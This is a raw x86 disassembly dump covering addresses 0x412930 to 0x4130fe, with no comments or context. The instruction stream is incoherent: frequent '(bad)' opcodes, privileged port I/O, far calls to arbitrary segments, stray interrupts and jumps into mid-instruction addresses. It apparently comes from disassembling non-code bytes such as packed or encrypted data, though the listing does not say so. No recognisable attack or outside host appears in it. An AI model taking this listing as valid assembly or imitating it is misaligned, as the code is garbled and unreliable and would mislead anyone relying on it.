  412930:	and    esp,ebx
  412932:	jo     0x412994
  412934:	xor    DWORD PTR [ecx-0x52],edi
  412937:	or     DWORD PTR [ebx],0x36deaa15
  41293d:	int3   
  41293e:	dec    ebx
  41293f:	add    eax,ebp
  412941:	push   esi
  412942:	aas    
  412943:	and    al,0x96
  412945:	retf   
  412946:	adc    al,0x2d
  412948:	xor    al,0x16
  41294a:	inc    eax
  41294b:	add    ecx,DWORD PTR [edx]
  41294d:	cmp    bh,ch
  41294f:	retf   
  412950:	cdq    
  412951:	sbb    esp,DWORD PTR [ecx+0x554960fb]
  412957:	add    edi,DWORD PTR [eax+0x46f0e5ca]
  41295d:	data16 int3 
  41295f:	mov    WORD PTR [esi+0x73],cs
  412962:	(bad)  
  412963:	div    BYTE PTR [ebx+0x1649b386]
  412969:	fnstenv [edx+0x23]
  41296c:	cwde   
  41296d:	mov    BYTE PTR ds:0xc9a30268,cl
  412973:	je     0x412932
  412975:	inc    edx
  412976:	pop    ebp
  412977:	in     eax,0x6
  412979:	push   0xe052ccf5
  41297e:	loop   0x412987
  412980:	icebp  
  412981:	test   DWORD PTR [ebp-0x6a],eax
  412984:	daa    
  412985:	es das 
  412987:	in     al,dx
  412988:	add    esi,DWORD PTR [eax]
  41298a:	lea    ebp,[edi+ecx*4]
  41298d:	jo     0x412953
  41298f:	clc    
  412990:	aad    0x89
  412992:	int    0x5f
  412994:	or     bl,BYTE PTR [edi+0x10d72044]
  41299a:	mov    al,ds:0x1faa2986
  41299f:	std    
  4129a0:	cmp    al,0xdb
  4129a2:	dec    edi
  4129a3:	ficomp DWORD PTR [ecx+edi*8-0x1b]
  4129a7:	pop    ecx
  4129a8:	dec    edx
  4129a9:	jae    0x412939
  4129ab:	fsub   DWORD PTR [ebx+0x30]
  4129ae:	xchg   esi,eax
  4129af:	xlat   BYTE PTR ds:[ebx]
  4129b0:	jno    0x412a04
  4129b2:	lods   al,BYTE PTR ds:[esi]
  4129b3:	cdq    
  4129b4:	in     al,dx
  4129b5:	sub    BYTE PTR ss:[ecx+ecx*2+0x411c6a8b],bl
  4129bd:	lahf   
  4129be:	sub    ecx,DWORD PTR [ecx-0x5a]
  4129c1:	jns    0x412a37
  4129c3:	fisttp WORD PTR [edx+0xd63032b]
  4129c9:	sbb    eax,0xc2cea0f2
  4129ce:	loopne 0x4129cc
  4129d0:	in     al,dx
  4129d1:	adc    al,0x4e
  4129d3:	ja     0x412970
  4129d5:	mov    ebp,0x86498b8d
  4129da:	mov    al,ds:0xdae058a6
  4129df:	mov    edi,0x88f81bc5
  4129e4:	retf   0xecb
  4129e7:	pop    es
  4129e8:	enter  0x84e9,0xee
  4129ec:	inc    ebp
  4129ed:	inc    edi
  4129ee:	or     ebp,DWORD PTR [edi+0x66]
  4129f1:	mov    ah,BYTE PTR [esi+0x54fd6776]
  4129f7:	dec    edi
  4129f8:	ret    0x16b1
  4129fb:	inc    ebp
  4129fc:	xor    BYTE PTR [edi],dh
  4129fe:	mov    ch,0x47
  412a00:	ret    0xf1e1
  412a03:	sti    
  412a04:	mov    ah,0x48
  412a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a07:	jge    0x4129f7
  412a09:	neg    BYTE PTR [ecx-0x44a3e9c]
  412a0f:	mov    edx,0x6bd652b3
  412a14:	and    DWORD PTR [ebx],0x33
  412a17:	int3   
  412a18:	fsubr  QWORD PTR [esi+0xd]
  412a1b:	(bad)  
  412a1c:	fwait
  412a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a1e:	out    dx,al
  412a1f:	push   cs
  412a20:	jle    0x4129e0
  412a22:	repnz popa 
  412a24:	or     al,0x61
  412a26:	push   0xffffffc9
  412a28:	lods   al,BYTE PTR ds:[esi]
  412a29:	es scas al,BYTE PTR es:[edi]
  412a2b:	test   al,0xa4
  412a2d:	fstp   TBYTE PTR [esi]
  412a2f:	jns    0x412a0d
  412a31:	jecxz  0x412a38
  412a33:	clc    
  412a34:	std    
  412a35:	xchg   esp,eax
  412a36:	repz adc DWORD PTR ds:0x86d7e8c4,edx
  412a3d:	rol    edx,1
  412a3f:	add    eax,0xb937d3bc
  412a44:	call   0x5928:0xe1170dd9
  412a4b:	jne    0x412a47
  412a4d:	push   ebx
  412a4e:	push   edi
  412a4f:	push   ss
  412a50:	dec    ebp
  412a51:	or     edx,ebp
  412a53:	jnp    0x412a1f
  412a55:	int    0x72
  412a57:	aad    0x8e
  412a59:	jg     0x412a36
  412a5b:	stc    
  412a5c:	lahf   
  412a5d:	imul   al
  412a5f:	dec    esp
  412a60:	cmp    DWORD PTR [edx-0x4ac3abfa],esp
  412a66:	pop    eax
  412a67:	mov    ebx,0x35482784
  412a6c:	es jb  0x412aa6
  412a6f:	and    eax,0x3f1b2723
  412a74:	cmp    al,0x12
  412a76:	ret    0xad68
  412a79:	(bad)  
  412a7b:	(bad)  [ecx+edx*2+0x2c1ee8a9]
  412a82:	jnp    0x412a0c
  412a84:	add    DWORD PTR [edi],0x2e
  412a87:	push   ebx
  412a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a89:	pop    edx
  412a8a:	adc    al,0xd5
  412a8c:	int    0xd3
  412a8e:	dec    esp
  412a8f:	inc    eax
  412a90:	aaa    
  412a91:	pop    ebx
  412a92:	dec    ecx
  412a93:	lods   eax,DWORD PTR ds:[esi]
  412a94:	push   0xf4800e32
  412a99:	pop    ss
  412a9a:	and    BYTE PTR [edx],ch
  412a9c:	cdq    
  412a9d:	xor    eax,0xa4f7b734
  412aa2:	push   0x2a00d6f0
  412aa7:	inc    ebx
  412aa8:	xchg   ecx,eax
  412aa9:	fstp   DWORD PTR [ecx+eiz*2]
  412aac:	sbb    eax,0x8d0e0909
  412ab1:	mov    ds:0xad34e42,eax
  412ab6:	adc    DWORD PTR [eax],edx
  412ab8:	dec    eax
  412ab9:	mov    al,0x31
  412abb:	test   eax,0xbf894810
  412ac0:	mov    cl,0xc0
  412ac2:	cmp    DWORD PTR [ebx+0x5c],edi
  412ac5:	mov    bl,0xf3
  412ac7:	push   ecx
  412ac8:	mov    ecx,0x6ee82bae
  412acd:	nop
  412ace:	jl     0x412b31
  412ad0:	inc    ecx
  412ad1:	cwde   
  412ad2:	mov    ds:0x961a0587,eax
  412ad7:	and    esi,DWORD PTR [eax]
  412ad9:	addr16 dec eax
  412adb:	ins    BYTE PTR es:[edi],dx
  412adc:	xor    DWORD PTR [ebp+0x58],eax
  412adf:	loop   0x412afa
  412ae1:	lahf   
  412ae2:	(bad)  
  412ae3:	cld    
  412ae4:	fxtract 
  412ae6:	fistp  QWORD PTR [ecx]
  412ae8:	fcomp  DWORD PTR [ecx+0x8]
  412aeb:	and    al,0x3f
  412aed:	push   edi
  412aee:	or     DWORD PTR [ebx*2+0x5358ed66],0x1e
  412af6:	inc    eax
  412af7:	into   
  412af8:	sbb    cl,BYTE PTR [ebx+0x2c]
  412afb:	test   al,0xcf
  412afe:	fcomp  DWORD PTR [esi+0x26d8a090]
  412b04:	xchg   ecx,eax
  412b05:	and    BYTE PTR [ebp+0x41],0x1
  412b09:	mov    dh,bh
  412b0b:	add    eax,0xb806189a
  412b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b11:	pop    ebx
  412b12:	bnd jbe 0x412aaa
  412b15:	mov    bl,0xb7
  412b17:	sti    
  412b18:	add    al,0x98
  412b1a:	rcr    cl,cl
  412b1c:	jae    0x412b10
  412b1e:	enter  0x2028,0x82
  412b22:	dec    esi
  412b23:	std    
  412b24:	in     eax,dx
  412b25:	cmp    cl,BYTE PTR [edx-0x2aa9311d]
  412b2b:	dec    esp
  412b2c:	jo     0x412b9f
  412b2e:	ret    
  412b2f:	sub    ebx,DWORD PTR [ecx-0x7b]
  412b32:	fs pop esp
  412b34:	dec    ecx
  412b35:	fiadd  DWORD PTR [si-0x60a8]
  412b3a:	mov    eax,esp
  412b3c:	leave  
  412b3d:	mov    WORD PTR [edi],?
  412b3f:	pminsw mm1,QWORD PTR [esi-0xad55163]
  412b46:	std    
  412b47:	xchg   ebp,eax
  412b48:	inc    ebx
  412b49:	push   ds
  412b4a:	das    
  412b4b:	mov    ebp,0x15ae857e
  412b50:	adc    BYTE PTR [ecx-0x3073a0ed],al
  412b56:	int    0x72
  412b58:	jmp    0x412ba0
  412b5a:	and    BYTE PTR [eax-0x28],dh
  412b5d:	in     eax,0x13
  412b5f:	add    al,0x63
  412b61:	leave  
  412b62:	in     al,dx
  412b63:	push   es
  412b64:	push   ds
  412b65:	ffree  st(0)
  412b67:	cmp    bh,BYTE PTR [ecx]
  412b69:	adc    BYTE PTR ds:0xd9e595ee,ah
  412b6f:	jbe    0x412b8c
  412b71:	mov    bh,BYTE PTR [edi-0xb939485]
  412b77:	jnp    0x412b1a
  412b79:	dec    ebp
  412b7a:	add    eax,0x19e8ecee
  412b7f:	and    eax,DWORD PTR [edi+0x22873468]
  412b85:	jg     0x412bb4
  412b87:	out    0x86,al
  412b89:	leave  
  412b8a:	call   0xba08:0xe31964a1
  412b91:	fdiv   DWORD PTR [edx+0x5bb943c8]
  412b97:	sub    DWORD PTR [ebp-0x74],ebp
  412b9a:	jp     0x412b37
  412b9c:	or     eax,0x79b90194
  412ba1:	push   cs
  412ba2:	fistp  WORD PTR [ebp+0xf]
  412ba5:	leave  
  412ba6:	icebp  
  412ba7:	std    
  412ba8:	add    bh,BYTE PTR [eax+0x67]
  412bab:	inc    ebx
  412bac:	out    dx,eax
  412bad:	in     al,dx
  412bae:	retf   0x565d
  412bb1:	push   edi
  412bb2:	aaa    
  412bb3:	mov    ds:0x64c6a237,al
  412bb8:	nop
  412bb9:	add    cl,bh
  412bbb:	ret    
  412bbc:	scas   al,BYTE PTR es:[edi]
  412bbd:	mov    ah,0x53
  412bbf:	lods   eax,DWORD PTR ds:[esi]
  412bc0:	push   ecx
  412bc1:	ret    
  412bc2:	rol    DWORD PTR [esi+0x59289d17],cl
  412bc8:	mov    dh,0x87
  412bca:	and    dl,BYTE PTR [ecx]
  412bcc:	gs sbb dl,dl
  412bcf:	stos   BYTE PTR es:[edi],al
  412bd0:	push   eax
  412bd1:	jbe    0x412bc2
  412bd3:	add    eax,0x5409f24a
  412bd8:	les    eax,FWORD PTR [ebp+0x28]
  412bdb:	push   ecx
  412bdc:	and    DWORD PTR [edx+0x64],ebx
  412bdf:	sub    eax,0x578bbbbd
  412be4:	out    0x8c,al
  412be6:	or     al,cl
  412be8:	je     0x412bfa
  412bea:	or     DWORD PTR [esi+0x68654cab],ecx
  412bf0:	cwde   
  412bf1:	std    
  412bf2:	loope  0x412b9b
  412bf4:	out    0xc8,eax
  412bf6:	test   al,0xc9
  412bf8:	and    al,BYTE PTR cs:[ebp+0x3444e8ce]
  412bff:	je     0x412bce
  412c01:	pop    ss
  412c02:	xchg   esp,eax
  412c03:	push   0x4fdb429f
  412c08:	pop    ss
  412c09:	mov    ecx,0xbf8cb22a
  412c0e:	xor    edx,DWORD PTR [esi-0x1e0446d6]
  412c14:	lds    ebx,FWORD PTR [ebp+ebx*8-0x69f23573]
  412c1b:	sar    BYTE PTR [ecx-0x19],0x1d
  412c1f:	xchg   ebx,eax
  412c20:	pop    ebx
  412c21:	xor    ecx,ecx
  412c23:	and    eax,0x56157e8f
  412c28:	or     ebx,esi
  412c2a:	sbb    BYTE PTR [edi+0x538e10b1],0xb4
  412c31:	(bad)  
  412c32:	cmp    BYTE PTR [eax],bl
  412c34:	jo     0x412c50
  412c36:	mov    ds:0x9b5a6f12,al
  412c3b:	repnz data16 mov al,ds:0xb0bea526
  412c42:	xchg   DWORD PTR [ebp-0x6d5068d],eax
  412c48:	fwait
  412c49:	lods   al,BYTE PTR ds:[esi]
  412c4a:	mov    esi,0xa08c699e
  412c4f:	jge    0x412cbb
  412c51:	add    eax,0x2add028d
  412c56:	inc    ebx
  412c57:	outs   dx,BYTE PTR ds:[esi]
  412c58:	mov    DWORD PTR [esi-0x70],ebx
  412c5b:	jg     0x412c0b
  412c5d:	pop    ecx
  412c5e:	jmp    0xa006:0x943f7e69
  412c65:	mov    eax,ds:0xe0309181
  412c6a:	mov    bl,0x22
  412c6c:	repnz sbb DWORD PTR [edi-0x27cb3526],eax
  412c73:	psubsb mm6,QWORD PTR [esi]
  412c76:	(bad)  
  412c77:	lahf   
  412c78:	out    dx,al
  412c79:	jle    0x412c8c
  412c7b:	shr    edi,cl
  412c7d:	cmp    eax,0x3db9f466
  412c82:	adc    eax,0x855714ab
  412c87:	and    ebx,edx
  412c89:	add    BYTE PTR [ecx-0x3d59c561],dh
  412c8f:	xchg   esp,ebp
  412c91:	call   0xd798:0x4204310d
  412c98:	jbe    0x412c72
  412c9a:	enter  0xadf3,0xf5
  412c9e:	inc    ebp
  412c9f:	icebp  
  412ca0:	out    dx,eax
  412ca1:	add    edx,0xb6270c0f
  412ca7:	cmc    
  412ca8:	(bad)  
  412caa:	sub    esi,esp
  412cac:	les    ebx,FWORD PTR [esi]
  412cae:	or     eax,0x4a5c11ef
  412cb3:	fisttp DWORD PTR [ebx]
  412cb5:	lea    esp,[edx+0x51]
  412cb8:	or     bh,BYTE PTR [esi]
  412cba:	(bad)  
  412cbb:	int    0x7
  412cbd:	push   ebx
  412cbe:	adc    DWORD PTR [esi],edi
  412cc0:	les    ebp,FWORD PTR [ebx+0x1e]
  412cc3:	push   ebx
  412cc4:	icebp  
  412cc5:	mov    eax,ds:0xc2c36d0a
  412cca:	outs   dx,DWORD PTR ds:[esi]
  412ccb:	fisub  DWORD PTR [ebx-0x53]
  412cce:	nop
  412ccf:	or     al,0x72
  412cd1:	mov    esi,0xf5b4e482
  412cd6:	xor    eax,0xbb6861e4
  412cdb:	std    
  412cdc:	dec    edi
  412cdd:	repz jecxz 0x412cf2
  412ce0:	xchg   BYTE PTR [ecx],bl
  412ce2:	ins    BYTE PTR es:[edi],dx
  412ce3:	push   ebp
  412ce4:	mov    ss,WORD PTR [edx+0xc]
  412ce7:	inc    ebx
  412ce8:	psllw  mm2,mm5
  412ceb:	xchg   BYTE PTR [ebp-0x62],al
  412cee:	cmp    BYTE PTR [ecx],bl
  412cf0:	mov    eax,0x63e6dd58
  412cf5:	or     eax,0xaebd20c1
  412cfa:	bound  ecx,QWORD PTR [ebx]
  412cfc:	adc    eax,0xf78262c2
  412d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d02:	and    DWORD PTR [edx-0x78556196],ecx
  412d08:	out    dx,eax
  412d09:	lahf   
  412d0a:	sti    
  412d0b:	or     eax,0x2a8426ba
  412d10:	lea    edx,[eax+esi*4-0x18deda3c]
  412d17:	sar    BYTE PTR [ebx-0x3b],1
  412d1a:	lock ja 0x412cc0
  412d1d:	dec    esp
  412d1e:	sub    edx,DWORD PTR [edi+0x207e632f]
  412d24:	fsincos 
  412d26:	arpl   WORD PTR [ebx-0x42f3c8e7],sp
  412d2c:	daa    
  412d2d:	pop    edx
  412d2e:	pop    ds
  412d2f:	xor    BYTE PTR [edi+0xb51d466],0x6b
  412d36:	js     0x412d81
  412d38:	ret    
  412d39:	and    bl,BYTE PTR [ecx+eiz*8]
  412d3c:	and    BYTE PTR [esi+0xb47fd7e],dh
  412d42:	loope  0x412dae
  412d44:	imul   ebx,DWORD PTR [esi],0x44991e9d
  412d4a:	add    edx,DWORD PTR [ecx]
  412d4c:	rol    BYTE PTR [edi-0x2d8dc3ee],1
  412d52:	xchg   ebp,eax
  412d53:	mov    ch,BYTE PTR [ebx+eax*8+0x53f1f3eb]
  412d5a:	cmp    al,0x3a
  412d5c:	aad    0x87
  412d5e:	xlat   BYTE PTR ds:[ebx]
  412d5f:	mov    ah,0x97
  412d61:	and    dl,al
  412d63:	hlt    
  412d64:	fldenv [edx+0x77]
  412d67:	mov    ds:0x4be0f377,al
  412d6c:	jle    0x412d55
  412d6e:	in     eax,0xa4
  412d70:	(bad)  
  412d71:	cmc    
  412d72:	xchg   esi,eax
  412d73:	fucom  st(2)
  412d75:	xor    al,0xcb
  412d77:	inc    ebx
  412d78:	daa    
  412d79:	mov    DWORD PTR [ebx+eiz*2+0xb941422],eax
  412d80:	push   esi
  412d81:	test   eax,0x53797ea2
  412d86:	push   cs
  412d87:	push   edx
  412d88:	xlat   BYTE PTR ds:[ebx]
  412d89:	xor    al,bh
  412d8b:	xor    eax,0xf98ffe69
  412d90:	and    ebp,DWORD PTR [eax]
  412d92:	out    0x4f,eax
  412d94:	call   0xe00:0xfd6d9995
  412d9b:	fs push es
  412d9d:	jle    0x412d7a
  412d9f:	sbb    edi,DWORD PTR [edx+0x18]
  412da2:	or     al,0xe3
  412da4:	adc    eax,0x70711eae
  412da9:	(bad)  
  412dab:	call   0x99f8:0xfefb0283
  412db2:	fld    QWORD PTR [esi]
  412db4:	(bad)  
  412db5:	push   0xfffffff7
  412db7:	sbb    esp,esi
  412db9:	out    dx,eax
  412dba:	jle    0x412da2
  412dbc:	mov    cl,0xb1
  412dbe:	dec    esi
  412dbf:	daa    
  412dc0:	pop    eax
  412dc1:	or     al,0xeb
  412dc3:	repnz out 0xab,eax
  412dc6:	js     0x412d7e
  412dc8:	sub    BYTE PTR [edx-0x437ca09b],ch
  412dce:	and    ecx,DWORD PTR [ebx+0x19ce3dd8]
  412dd4:	mov    al,0xa4
  412dd6:	pop    ecx
  412dd7:	fmul   QWORD PTR [edx+0x7a]
  412dda:	xchg   ebx,eax
  412ddb:	inc    esi
  412ddc:	xchg   edi,eax
  412ddd:	cmp    BYTE PTR [esi-0x18],0xfe
  412de1:	xor    eax,0x9cb397b9
  412de6:	(bad)  
  412de7:	lock jae 0x412e31
  412dea:	ins    BYTE PTR es:[edi],dx
  412deb:	fcomp  QWORD PTR [ebx]
  412ded:	inc    edx
  412dee:	jb     0x412e0b
  412df0:	inc    esi
  412df1:	inc    ebx
  412df2:	jle    0x412dbd
  412df4:	(bad)  
  412df5:	in     al,dx
  412df6:	xchg   ebx,eax
  412df7:	or     esp,ecx
  412df9:	cdq    
  412dfa:	je     0x412dd3
  412dfc:	pop    ss
  412dfd:	stc    
  412dfe:	jle    0x412e2c
  412e00:	sar    DWORD PTR [edi-0x3cbfa2f],0x67
  412e07:	adc    DWORD PTR ds:[ebp+0x45],ecx
  412e0b:	mov    eax,ds:0x6ef65b29
  412e10:	or     BYTE PTR [ebx+0x32],0x8a
  412e14:	push   ss
  412e15:	mov    ds:0x35ff7ee6,eax
  412e1a:	cmp    al,0x63
  412e1c:	xor    al,0xf8
  412e1e:	sub    eax,0xc8f8137
  412e23:	jg     0x412e4d
  412e25:	lods   eax,DWORD PTR ds:[esi]
  412e26:	mov    dh,0x4d
  412e28:	add    BYTE PTR [ebp-0x61c65654],ch
  412e2e:	out    dx,al
  412e2f:	ret    0xe2b6
  412e32:	cli    
  412e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e34:	(bad)  
  412e35:	ds jnp 0x412e8c
  412e38:	jmp    0x1c60:0x12f04ec3
  412e3f:	ins    BYTE PTR es:[edi],dx
  412e40:	push   ebp
  412e41:	xchg   esi,eax
  412e42:	aaa    
  412e43:	adc    DWORD PTR [ebx],esi
  412e45:	xchg   ebp,eax
  412e46:	(bad)
  412e49:	jbe    0x412dd3
  412e4b:	adc    al,0xc1
  412e4d:	fnstenv [esi]
  412e4f:	leave  
  412e50:	hlt    
  412e51:	cmp    edi,DWORD PTR [ecx-0x43]
  412e54:	adc    eax,0x834db33e
  412e59:	aad    0x2b
  412e5b:	js     0x412e44
  412e5d:	int3   
  412e5e:	mov    ds:0x2883fd3,al
  412e63:	jnp    0x412e52
  412e65:	and    eax,0x4ca6aee3
  412e6a:	or     bl,BYTE PTR [edi]
  412e6c:	in     eax,0x5d
  412e6e:	lods   al,BYTE PTR ds:[esi]
  412e6f:	rol    DWORD PTR [esi],1
  412e71:	nop
  412e72:	jmp    0x8292:0x73d553a2
  412e79:	or     BYTE PTR [ebp-0x17ef676f],cl
  412e7f:	test   eax,0x6c18faaa
  412e84:	xchg   edi,eax
  412e85:	ss out 0x3e,eax
  412e88:	xchg   DWORD PTR [esi-0xf],edx
  412e8b:	aas    
  412e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e8d:	call   0xb0649c01
  412e92:	sti    
  412e93:	aad    0x2e
  412e95:	mov    eax,0x1dd219ce
  412e9a:	xor    ebp,DWORD PTR [ecx-0x2d336b14]
  412ea0:	shl    bl,0x98
  412ea3:	xchg   ecx,eax
  412ea4:	(bad)  
  412ea5:	jl     0x412e6f
  412ea7:	adc    DWORD PTR [ecx-0x7fa11db2],ebx
  412ead:	inc    edx
  412eae:	in     al,dx
  412eaf:	test   eax,0xf01b0ef
  412eb4:	cld    
  412eb5:	outs   dx,BYTE PTR ds:[esi]
  412eb6:	shl    esp,cl
  412eb8:	(bad)  
  412eb9:	int3   
  412eba:	sbb    cl,BYTE PTR [edx-0x49ea69a2]
  412ec0:	jmp    0x412ea4
  412ec2:	cmp    ebx,DWORD PTR [ebx+0x49]
  412ec5:	mov    ds:0x6d201140,eax
  412eca:	and    DWORD PTR [ebp+0x3e],0x6d04f246
  412ed1:	adc    eax,edi
  412ed3:	mov    eax,ds:0xfecf6208
  412ed8:	fadd   QWORD PTR [ebx]
  412eda:	pop    es
  412edb:	dec    edi
  412edc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412edd:	adc    eax,0x128684fc
  412ee2:	cmp    ecx,DWORD PTR [ecx]
  412ee4:	cmp    DWORD PTR [ebx-0x78],ecx
  412ee7:	test   DWORD PTR [eax-0x74541595],edx
  412eed:	push   es
  412eee:	sti    
  412eef:	dec    ebp
  412ef0:	xor    eax,0xa8948007
  412ef5:	fadd   QWORD PTR [ebp-0x50dbeb08]
  412efb:	cmc    
  412efc:	adc    BYTE PTR [esi+ebp*8+0x79],ch
  412f00:	ins    BYTE PTR es:[edi],dx
  412f01:	cmp    BYTE PTR ds:0x8d65486f,al
  412f07:	dec    esp
  412f08:	adc    eax,0xe0958822
  412f0d:	add    edi,DWORD PTR [esi]
  412f0f:	cdq    
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	add    al,0xad
  412f13:	xor    al,0x59
  412f15:	mov    WORD PTR [edi+edi*1],ss
  412f18:	popf   
  412f19:	jne    0x412f81
  412f1b:	mov    al,ds:0x760b3dd
  412f20:	sbb    DWORD PTR [eax-0x6d4545f7],edi
  412f26:	fild   DWORD PTR [eax]
  412f28:	xor    ch,BYTE PTR [edi+edx*4]
  412f2b:	mov    ch,0x96
  412f2d:	jne    0x412f21
  412f2f:	iret   
  412f30:	gs cmc 
  412f32:	std    
  412f33:	sbb    BYTE PTR [esi-0x40],ah
  412f36:	push   edx
  412f37:	push   ecx
  412f38:	add    al,dl
  412f3a:	xor    DWORD PTR [edi-0x3b],0xa115243e
  412f41:	jp     0x412ee2
  412f43:	mov    esi,0xaeb3cd83
  412f48:	aas    
  412f49:	cdq    
  412f4a:	jne    0x412fc8
  412f4c:	out    0xa2,eax
  412f4e:	pop    eax
  412f4f:	inc    ebx
  412f50:	adc    BYTE PTR [eax-0x66],bh
  412f53:	cs mov esi,0xc0bb5277
  412f59:	ret    
  412f5a:	(bad)  
  412f5c:	ret    0x70f3
  412f5f:	push   ebp
  412f60:	sub    DWORD PTR [edi+edi*2+0x18],0x41
  412f65:	pop    esp
  412f66:	dec    edi
  412f67:	adc    BYTE PTR [ebx-0x15],bl
  412f6a:	sub    al,0x6d
  412f6c:	retf   
  412f6d:	xchg   edi,eax
  412f6e:	inc    esi
  412f6f:	cmc    
  412f70:	(bad)  
  412f71:	jb     0x412fa6
  412f73:	adc    DWORD PTR [esi+ebp*1-0x42],edi
  412f77:	pop    es
  412f78:	xchg   esi,eax
  412f79:	mov    bh,0x50
  412f7b:	gs pop ecx
  412f7d:	inc    ebp
  412f7e:	lds    ebx,FWORD PTR [ebp+0x986ecf9]
  412f84:	(bad)  
  412f85:	mov    ch,0x8
  412f87:	cmp    BYTE PTR [edi],dh
  412f89:	stos   BYTE PTR es:[edi],al
  412f8a:	xchg   ebx,eax
  412f8b:	cmp    ebx,DWORD PTR [ebx+0x719bcfc9]
  412f91:	jmp    0x413003
  412f93:	inc    edx
  412f94:	and    BYTE PTR [eax-0x15392695],dl
  412f9a:	shl    eax,0x6b
  412f9d:	cwde   
  412f9e:	xchg   ebp,edx
  412fa0:	imul   ebx,ebp,0xa76039fc
  412fa6:	or     eax,0x26eff668
  412fab:	mov    eax,0xa14f2df
  412fb0:	xchg   esi,eax
  412fb1:	pusha  
  412fb2:	stos   BYTE PTR es:[edi],al
  412fb3:	hlt    
  412fb4:	mov    ds:0xfb87cb42,eax
  412fb9:	pop    ds
  412fba:	jecxz  0x412f88
  412fbc:	retf   
  412fbd:	mov    ds,WORD PTR [edx]
  412fbf:	cmp    al,0xfb
  412fc1:	mov    WORD PTR [ecx+0x25e39ec6],ss
  412fc7:	adc    ah,BYTE PTR [edi-0x3668856f]
  412fcd:	scas   al,BYTE PTR es:[edi]
  412fce:	popa   
  412fcf:	pop    esp
  412fd0:	xchg   esi,eax
  412fd1:	xchg   ch,cl
  412fd3:	xchg   ecx,eax
  412fd4:	pop    ebx
  412fd5:	pop    eax
  412fd6:	dec    ecx
  412fd7:	ins    DWORD PTR es:[edi],dx
  412fd8:	mov    ch,0x53
  412fda:	not    BYTE PTR [edi-0x43]
  412fdd:	adc    al,al
  412fdf:	add    DWORD PTR [edx-0x42],esi
  412fe2:	iret   
  412fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fe4:	retf   0xb6e8
  412fe7:	add    al,0x79
  412fe9:	jecxz  0x413053
  412feb:	mov    bl,0xd9
  412fed:	cmc    
  412fee:	add    ecx,DWORD PTR [ecx-0xb1ed514]
  412ff4:	cmp    al,0xb1
  412ff6:	pop    esp
  412ff7:	fisttp QWORD PTR [esi+0x163aaec3]
  412ffd:	outs   dx,DWORD PTR ds:[esi]
  412ffe:	xor    bh,bh
  413000:	mov    dl,0xb1
  413002:	pop    ss
  413003:	mov    bh,0x9b
  413005:	sub    ebp,DWORD PTR [edx-0x4544aede]
  41300b:	mov    dl,0xe7
  41300d:	mov    ch,0x81
  41300f:	mov    esi,0x8a30822a
  413014:	stc    
  413015:	pop    edx
  413016:	cmp    eax,0xeaa847d3
  41301b:	mov    dh,0x54
  41301d:	into   
  41301e:	dec    ebp
  41301f:	div    DWORD PTR ds:0x4a8f
  413024:	or     cl,bl
  413026:	hlt    
  413027:	xlat   BYTE PTR ds:[ebx]
  413028:	xchg   edx,eax
  413029:	jae    0x413016
  41302b:	cmp    al,ah
  41302d:	repz sub ah,bl
  413030:	mov    ch,0x25
  413032:	outs   dx,BYTE PTR ds:[esi]
  413033:	imul   ebp,edx,0xa6e67885
  413039:	lock mov cl,0xe9
  41303c:	adc    DWORD PTR ds:0x6ea8812,ebp
  413042:	sub    eax,0x17db56f9
  413047:	sahf   
  413048:	sub    cl,BYTE PTR [edx]
  41304a:	mov    al,0x1f
  41304c:	sub    al,0x3b
  41304e:	dec    ecx
  41304f:	dec    ebx
  413050:	out    0xb1,eax
  413052:	rol    BYTE PTR [esi+0x76],1
  413055:	push   edi
  413056:	inc    ax
  413058:	(bad)  
  413059:	or     edi,ecx
  41305b:	(bad)  [edx]
  41305d:	out    dx,eax
  41305e:	xor    ebx,eax
  413060:	fidiv  WORD PTR ds:0xd8533359
  413066:	outs   dx,BYTE PTR ds:[esi]
  413067:	jg     0x4130d4
  413069:	fucomip st,st(7)
  41306b:	push   ebx
  41306c:	out    0x61,eax
  41306e:	bnd jns 0x4130aa
  413071:	sbb    ebp,esi
  413073:	out    0x31,al
  413075:	imul   edx,DWORD PTR [edx-0x28],0x7356adb1
  41307c:	int3   
  41307d:	push   ebx
  41307e:	pushf  
  41307f:	call   0xd0ba619a
  413084:	popf   
  413085:	inc    esp
  413086:	lahf   
  413087:	(bad)  
  413088:	push   esp
  413089:	and    eax,0x30eb13f3
  41308e:	pop    ebp
  41308f:	jmp    0x5779:0xdbd86715
  413096:	lock or DWORD PTR [ebx-0x58],0xffffff90
  41309b:	out    0xb3,eax
  41309d:	adc    eax,0xc3c385e8
  4130a2:	dec    ebp
  4130a3:	xchg   edi,eax
  4130a4:	stos   WORD PTR es:[edi],ax
  4130a6:	dec    edi
  4130a7:	sbb    al,0x8f
  4130a9:	fbld   TBYTE PTR [ebp-0x55d36a72]
  4130af:	in     eax,0x22
  4130b1:	mov    bh,0x6
  4130b3:	retf   
  4130b4:	std    
  4130b5:	push   0x15d5ad4e
  4130ba:	push   0xffffffd9
  4130bc:	inc    esp
  4130bd:	mov    al,ds:0xec894f76
  4130c2:	jb     0x413092
  4130c4:	cmp    esi,DWORD PTR [ebx+ebp*2]
  4130c7:	push   esi
  4130c8:	arpl   WORD PTR [bp+0x62],bx
  4130cc:	cmp    BYTE PTR [esi+0x6f],ah
  4130cf:	adc    ah,al
  4130d1:	sub    bl,BYTE PTR [edi]
  4130d3:	mov    cl,0x14
  4130d5:	int    0xc3
  4130d7:	cmp    DWORD PTR [esi-0x4df15a43],esi
  4130dd:	in     eax,dx
  4130de:	push   esi
  4130df:	sbb    BYTE PTR [ebp-0x7aa8943e],cl
  4130e5:	cmp    BYTE PTR [eax-0x71],bh
  4130e8:	clc    
  4130e9:	mov    al,0xf8
  4130eb:	mov    ch,0x9a
  4130ed:	mov    ds:0xaa7f985c,eax
  4130f2:	add    DWORD PTR [esi-0x4e],ebx
  4130f5:	add    al,0xe6
  4130f7:	out    0x62,eax
  4130f9:	aaa    
  4130fa:	addr16 fwait
  4130fc:	cmp    ah,BYTE PTR [eax]
  4130fe:	int3   
